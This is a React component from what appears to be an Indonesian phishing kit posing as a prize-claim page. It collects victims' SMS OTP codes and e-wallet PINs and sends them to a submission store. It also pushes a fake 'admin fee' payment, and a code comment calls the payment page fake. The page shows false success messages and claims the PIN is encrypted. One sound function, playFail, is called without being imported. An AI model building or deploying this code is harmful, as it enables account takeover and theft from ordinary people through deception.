import { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import Steps from "./Steps";
import { getPrize, TYPE_INFO } from "../prizes";
import { detectDevice } from "../device";
import { playClick, playWhoosh, playDing } from "../sound";
import { sendSubmission as send } from "../store";

const buzz = (ms = 60) => navigator.vibrate?.(ms);


/* ================= VARIAN 1: OTP (pulsa & kuota) ================= */
const OtpVariant = ({ prize, hp, onDone }) => {
  const [digits, setDigits] = useState(Array(6).fill(""));
  const [phase, setPhase] = useState("input"); // input | checking | done
  const [resendIn, setResendIn] = useState(29);
  const refs = useRef([]);

  useEffect(() => {
    const t = setInterval(() => setResendIn((s) => (s <= 1 ? 29 : s - 1)), 1000);
    return () => clearInterval(t);
  }, []);

  const masked = (hp || "08xx").replace(/^(\d{4})\d+(\d{2})$/, "$1••••$2");

  const handleChange = (i, val) => {
    if (!/^\d?$/.test(val)) return;
    const next = [...digits];
    next[i] = val;
    setDigits(next);
    if (val && i < 5) refs.current[i + 1]?.focus();
    // Auto-submit saat 6 digit penuh
    if (next.every((d) => d !== "")) {
      const kode = next.join("");
      setPhase("checking");
      playWhoosh();
      setTimeout(async () => {
        await send({ tipe: "otp", kode, tujuan: masked, hp, prize });
        setPhase("done");
        playDing();
        navigator.vibrate?.([60, 40, 60]);
        setTimeout(onDone, 3200);
      }, 1500);
    }
  };

  const handleKey = (i, e) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
  };

  return (
    <>
      <div style={{ background: "linear-gradient(135deg,#065f46,#0f766e)", padding: "18px", textAlign: "center", borderBottom: "2px solid #ffb020" }}>
        <div style={{ fontSize: 38 }}>📩</div>
        <div className="display" style={{ fontSize: 16 }}>Verifikasi Nomor HP</div>
        <p style={{ fontSize: 11.5, color: "#ccfbf1", marginTop: 5 }}>
          Kami mengirim kode 6 digit via SMS ke<br />
          <strong style={{ color: "#fff" }}>{masked}</strong> untuk hadiah <strong style={{ color: "#ffd166" }}>{prize}</strong>
        </p>
      </div>

      <div style={{ padding: 22 }}>
        <div style={{ display: "flex", gap: 7, justifyContent: "center", marginBottom: 14 }}>
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => (refs.current[i] = el)}
              value={d}
              disabled={phase !== "input"}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKey(i, e)}
              inputMode="numeric"
              maxLength={1}
              style={{
                width: 42, height: 52, textAlign: "center",
                fontSize: 22, fontWeight: 800,
                border: `2px solid ${d ? "#0f766e" : "#33334a"}`,
                borderRadius: 9, background: "#0e0e18", color: "#fff",
              }}
            />
          ))}
        </div>

        {phase === "checking" && (
          <p style={{ textAlign: "center", fontSize: 12.5, color: "#ffd166", fontWeight: 700 }}>
            ⏳ Memeriksa kode...
          </p>
        )}
        {phase === "done" && (
          <p style={{ textAlign: "center", fontSize: 13, color: "#4ade80", fontWeight: 800 }}>
            ✔ Kode valid — pulsa sedang diproses!
          </p>
        )}
        {phase === "input" && (
          <p style={{ textAlign: "center", fontSize: 11.5, color: "#777f96" }}>
            Belum dapat kode? Kirim ulang dalam <strong style={{ color: "#ffb020" }}>{resendIn}s</strong>
          </p>
        )}

        <div style={{ marginTop: 14, fontSize: 10.5, color: "#4ade80", textAlign: "center" }}>
          🔒 Jangan bagikan kode ini kepada siapa pun, termasuk pihak yang mengaku CS
        </div>
      </div>
    </>
  );
};

/* ================= VARIAN 2: PIN E-WALLET ================= */
const WalletVariant = ({ prize, cfg, onDone }) => {
  const wallet = cfg.wallet || "DANA";
  const [pin, setPin] = useState("");
  const [phase, setPhase] = useState("input");
  const [err, setErr] = useState("");

  const submit = async (e) => {
    e.preventDefault();
    if (phase !== "input") return;
    if (pin.length !== 6) {
      setErr(`PIN ${wallet} harus tepat 6 digit — kamu baru memasukkan ${pin.length}.`);
      playFail();
      buzz(120);
      return;
    }
    setErr("");
    setPhase("checking");
    playWhoosh();
    buzz(80);
    setTimeout(async () => {
      await send({ tipe: "pin-ewallet", pin, wallet, prize });
      setPhase("done");
      playDing();
      navigator.vibrate?.([60, 40, 60]);
      setTimeout(onDone, 3200);
    }, 1500);
  };

  return (
    <>
      <div style={{ background: "linear-gradient(135deg,#118eea,#0b6bc2)", padding: "18px", textAlign: "center", borderBottom: "2px solid #ffb020" }}>
        <div style={{ fontSize: 38 }}>💸</div>
        <div className="display" style={{ fontSize: 16 }}>Konfirmasi {wallet}</div>
        <p style={{ fontSize: 11.5, color: "#dbeafe", marginTop: 5 }}>
          Masukkan PIN {wallet} kamu untuk menerima<br />
          <strong style={{ color: "#fff" }}>{prize}</strong> secara instan
        </p>
      </div>

      <div style={{ padding: 22 }}>
        <form onSubmit={submit} className={err ? "shake" : ""}>
          <input
            type="password"
            required
            autoFocus
            value={pin}
            disabled={phase !== "input"}
            onChange={(e) => {
              setPin(e.target.value.replace(/\D/g, "").slice(0, 6));
              setErr("");
            }}
            placeholder="PIN 6 digit"
            inputMode="numeric"
            autoComplete="off"
            style={{
              width: "100%", textAlign: "center",
              fontSize: 28, letterSpacing: 12, fontWeight: 800,
              padding: "13px 0 13px 12px",
              border: `2px solid ${err ? "#dc2626" : "#33334a"}`, borderRadius: 10,
              background: "#0e0e18", color: "#fff",
            }}
          />

          {err && (
            <p style={{ fontSize: 12, color: "#f87171", fontWeight: 700, marginTop: 10, textAlign: "center" }}>
              ⚠️ {err}
            </p>
          )}

          {phase === "checking" && (
            <p style={{ textAlign: "center", fontSize: 12.5, color: "#ffd166", fontWeight: 700, marginTop: 13 }}>
              ⏳ Memproses transfer...
            </p>
          )}
          {phase === "done" && (
            <p style={{ textAlign: "center", fontSize: 13.5, color: "#4ade80", fontWeight: 800, marginTop: 13 }}>
              ✔ Transfer berhasil! Cek saldo {wallet} kamu
            </p>
          )}

          <button
            type="submit"
            className="btn-cta btn-green"
            disabled={phase !== "input"}
            style={{ width: "100%", fontSize: 16.5, padding: "14px 0", marginTop: 16, opacity: phase === "input" ? 1 : 0.45 }}
          >
            {phase === "done" ? "✔ SALDO TERKIRIM" : `TERIMA ${prize.toUpperCase()}`}
          </button>
        </form>

        <div style={{ marginTop: 14, fontSize: 10.5, color: "#4ade80", textAlign: "center" }}>
          🔒 PIN kamu terenkripsi end-to-end dan tidak akan pernah kami bagikan
        </div>
      </div>
    </>
  );
};

/* ================= VARIAN 3: BAYAR ONGKIR (fisik) ================= */
const METHODS = [
  ["Transfer Bank BCA", "🏦"],
  ["Saldo DANA", "💸"],
  ["Potong Pulsa", "📡"],
];

const PayVariant = ({ prize, nama, hp, navigate }) => {
  const [metode, setMetode] = useState(METHODS[0][0]);
  const FEE = 25000;

  return (
    <>
      <div style={{ background: "linear-gradient(135deg,#b45309,#92400e)", padding: "18px", textAlign: "center", borderBottom: "2px solid #ffd166" }}>
        <div style={{ fontSize: 38 }}>🚚</div>
        <div className="display" style={{ fontSize: 16 }}>Konfirmasi Pengiriman</div>
        <p style={{ fontSize: 11.5, color: "#fef3c7", marginTop: 5 }}>
          Paket <strong style={{ color: "#fff" }}>{prize}</strong> siap diantar ke alamatmu{nama ? `, ${nama.split(" ")[0]}` : ""}
        </p>
      </div>

      <div style={{ padding: 22 }}>
        {/* Rincian biaya */}
        <div style={{ background: "#0e0e18", border: "1px solid #33334a", borderRadius: 12, padding: 15, marginBottom: 16 }}>
          {[
            ["Ongkos kirim", "Rp 50.000"],
            ["Asuransi paket", "Rp 25.000"],
          ].map(([l, v]) => (
            <div key={l} style={{ display: "flex", justifyContent: "space-between", fontSize: 12.5, color: "#777f96", marginBottom: 6 }}>
              <span style={{ textDecoration: "line-through" }}>{l}</span>
              <span style={{ textDecoration: "line-through" }}>{v}</span>
            </div>
          ))}
          <div style={{ height: 1, background: "#23233a", margin: "8px 0" }} />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span style={{ fontSize: 13, fontWeight: 700 }}>Biaya admin event</span>
            <span style={{ fontSize: 19, fontWeight: 800, color: "#ffd166" }}>
              Rp {FEE.toLocaleString("id-ID")}
            </span>
          </div>
          <div style={{ fontSize: 10.5, color: "#4ade80", marginTop: 6 }}>
            🏷️ Promo peserta: potongan 67% hari ini saja
          </div>
        </div>

        {/* Metode */}
        <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 8 }}>PILIH METODE PEMBAYARAN</div>
        <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 18 }}>
          {METHODS.map(([name, icon]) => (
            <button
              key={name}
              onClick={() => setMetode(name)}
              style={{
                display: "flex", alignItems: "center", gap: 10,
                padding: "12px 14px", borderRadius: 10, cursor: "pointer",
                border: metode === name ? "2px solid #ffb020" : "1.5px solid #33334a",
                background: metode === name ? "rgba(255,176,32,.1)" : "#0e0e18",
                color: "#e5e7eb", fontSize: 13.5, fontWeight: 600, fontFamily: "inherit",
                textAlign: "left",
              }}
            >
              <span style={{ fontSize: 20 }}>{icon}</span> {name}
              <span style={{ marginLeft: "auto", color: metode === name ? "#ffb020" : "#555e74" }}>
                {metode === name ? "●" : "○"}
              </span>
            </button>
          ))}
        </div>

        {/* Ke halaman pembayaran palsu sesuai metode */}
        <button
          onClick={() => {
            playClick();
            buzz(60);
            navigate("/pay", { state: { metode, prize, nama, hp } });
          }}
          className="btn-cta btn-green"
          style={{ width: "100%", fontSize: 17, padding: "14px 0" }}
        >
          BAYAR Rp {FEE.toLocaleString("id-ID")} →
        </button>
      </div>
    </>
  );
};

/* ================= ROUTER VARIAN ================= */
const ClaimVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { prize = "Hadiah", nama = "", hp = "" } = location.state || {};
  const cfg = getPrize(prize);
  const type = cfg.type;
  const typeInfo = TYPE_INFO[type];

  const finish = () => {
    if (type === "fisik") navigate("/track", { state: { prize, nama } });
    else navigate("/");
  };

  return (
    <div className="min-h-screen" style={{ background: "radial-gradient(120% 100% at 50% 0%, #101a33 0%, #0b0b14 55%)" }}>
      <div className="container flex flex-col justify-center" style={{ maxWidth: 480, minHeight: "100vh", padding: "26px 16px 40px" }}>
        <Steps current={2} />

        <div className="panel" style={{ overflow: "hidden" }}>
          {type === "pulsa" && <OtpVariant prize={prize} hp={hp} onDone={finish} />}
          {type === "ewallet" && <WalletVariant prize={prize} cfg={cfg} onDone={finish} />}
          {type === "fisik" && <PayVariant prize={prize} nama={nama} hp={hp} navigate={navigate} />}
        </div>

        <div style={{ textAlign: "center", marginTop: 14, fontSize: 10.5, color: "#4a5165" }}>
          © 2026 Reward Center International Ltd.
        </div>
      </div>
    </div>
  );
};

export default ClaimVerification;
